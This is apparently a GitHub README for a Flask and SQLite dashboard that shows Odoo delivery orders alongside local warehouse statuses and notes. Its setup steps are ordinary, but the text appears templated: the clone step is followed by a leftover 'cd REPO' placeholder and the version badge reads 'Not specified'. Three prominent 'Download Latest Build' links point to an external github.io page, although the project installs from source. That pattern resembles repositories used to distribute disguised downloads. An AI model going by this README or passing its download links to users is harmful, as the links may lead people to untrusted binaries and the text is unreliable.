# Warehouse Status and Notes App - Warehouse Delivery Order Tracker 2026

> **A Flask and SQLite web application for implementation managers who need a read-only overview of active Odoo delivery orders, warehouse progress, and operational notes.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordan-youngqcq3240/delivery-order-notes-tracker?style=flat-square)](https://github.com/jordan-youngqcq3240/delivery-order-notes-tracker)

---

<p align="center">
  <a href="https://jordan-youngqcq3240.github.io/delivery-order-notes-tracker/">
    <img src="https://img.shields.io/badge/Download-Warehouse%20Status%20and%20Notes%20App%20Latest-brightgreen?style=for-the-badge" alt="Download Warehouse Status and Notes App">
  </a>
</p>

> **[Download Warehouse Status and Notes App](https://jordan-youngqcq3240.github.io/delivery-order-notes-tracker/)**

---

[Download Latest Build](https://jordan-youngqcq3240.github.io/delivery-order-notes-tracker/)

---

## Overview

Warehouse Status and Notes App brings Odoo delivery information and warehouse coordination into a single focused dashboard. It reads active Odoo delivery orders without modifying them, allowing teams to inspect customer information, delivery schedules, and product lines from the browser.

Alongside the synchronized Odoo data, the application maintains a local workflow for warehouse operations and implementation management. Each delivery order can have a warehouse status and its own notes thread, while the SQLite-backed interface refreshes automatically to help users follow current changes.

---

## What It Provides

- Imports active delivery orders from Odoo in read-only mode
- Displays customers, schedules, and product lines together
- Tracks warehouse progress through local status stages
- Provides a separate notes thread for every order
- Persists locally managed statuses and notes with SQLite
- Applies read-only safeguards to data obtained from Odoo
- Protects dashboard access with a shared password
- Keeps the browser view current through automatic refresh
- Exposes application data through REST API endpoints
- Supports deployment on Render

---

## Installation

First, download the repository and move into the project folder:

```bash
git clone https://github.com/jordan-youngqcq3240/delivery-order-notes-tracker.git
cd REPO
```

Set up a Python virtual environment and enable it:

```bash
python -m venv .venv
source .venv/bin/activate
```

For Windows PowerShell, use:

```powershell
.venv\Scripts\Activate.ps1
```

Install the required packages:

```bash
pip install -r requirements.txt
```

Launch the Flask server from the project entry point:

```bash
flask run
```

When the project includes a separate application launcher, use that launcher instead. Visit the local URL printed by Flask in your web browser.

---

## Working with the Dashboard

The normal setup and usage sequence is:

1. Provide the Odoo connection details and dashboard access configuration.
2. Run the Flask application.
3. Navigate to the dashboard in a browser.
4. Inspect active delivery orders, including customer, schedule, and product data.
5. Set or change the warehouse status assigned to an order.
6. Record operational progress in that order's notes thread.
7. Connect to the REST API when another workflow needs to read dashboard information.

The dashboard may be left open while warehouse work is coordinated. Its automatic refresh capability helps reflect synchronized changes without requiring constant manual reloads.

---

## Configuration

Deployment-specific settings should be supplied through the application's environment configuration. Use the variable names expected by the project.

A representative configuration is shown below:

```env
ODOO_URL=https://your-odoo-instance.example
ODOO_DATABASE=your_database
ODOO_USERNAME=your_username
ODOO_PASSWORD=your_password
APP_PASSWORD=choose-a-shared-password
DATABASE_PATH=warehouse_status.sqlite3
```

The Odoo synchronization account should have read-only credentials. Do not commit passwords or deployment values to source control. When using Render, provide the corresponding environment variables through the service configuration.

---

## Requirements

- An environment capable of running a web application
- Python and Flask support
- Connectivity to the applicable Odoo instance
- Odoo credentials with permission to read active delivery orders
- SQLite for storing local statuses and notes
- A web browser for opening the dashboard
- Network access between the application and Odoo
- Render-compatible deployment settings for Render hosting

---

## Frequently Asked Questions

### What teams can use this application?

The dashboard is intended for warehouse personnel and implementation managers who need a common view of delivery progress and operational notes.

### Does it make changes to Odoo orders?

No. Odoo synchronization is read-only. Warehouse statuses and notes belong to the application and are not written back to Odoo as delivery-order edits.

### What stores the local workflow information?

SQLite stores the local notes and warehouse statuses. The database location is configurable as part of the deployment settings.

### How is access to the dashboard protected?

A shared password can be enabled for dashboard access. Configure the application's password before making the dashboard available to users.

### When does the dashboard refresh?

Automatic refresh is supported. The exact update behavior is determined by the application's runtime and synchronization configuration.

### What can cause delivery orders to be missing?

Check the Odoo URL, database name, credentials, network connection, and account permissions. If the problem continues, review the Flask logs for configuration or synchronization errors.

### Is Render supported?

Yes. The application supports Render deployment. Supply the required environment values and ensure the chosen storage arrangement is appropriate for locally retained statuses and notes.

### How do I receive new updates?

Pull the latest project changes or use the repository's latest build link. After updating, reinstall dependencies as needed and restart the Flask service.

---

## Planned Improvements

- Add more capable filtering and sorting for active delivery orders
- Provide broader customization of status workflows
- Make synchronization diagnostics easier to understand
- Expand the REST API documentation
- Clarify deployment instructions for hosted setups

---

## License

GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the complete license text.
